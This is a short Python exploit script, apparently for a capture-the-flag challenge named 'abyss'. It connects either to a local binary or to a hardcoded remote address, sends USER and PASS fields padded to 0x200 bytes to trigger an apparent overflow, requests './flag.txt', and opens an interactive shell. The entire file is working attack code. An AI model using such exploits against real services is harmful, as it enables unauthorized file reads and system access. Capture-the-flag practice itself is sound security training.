#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./abyss")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # input(">> ")
    io.send(ptr.p32(0))  # login
    user = "USER "
    user = user.ljust(0x200, "A")
    input(">> ")
    io.send(user)  # user
    pass_ = "PASS "
    pass_ = pass_.ljust(0x200, "A")
    input(">> ")
    io.send(pass_)  # pass
    input(">> ")
    io.send(ptr.p32(1))  # read
    input(">> ")
    io.send("./flag.txt")

    io.sh()


if __name__ == "__main__":
    main()
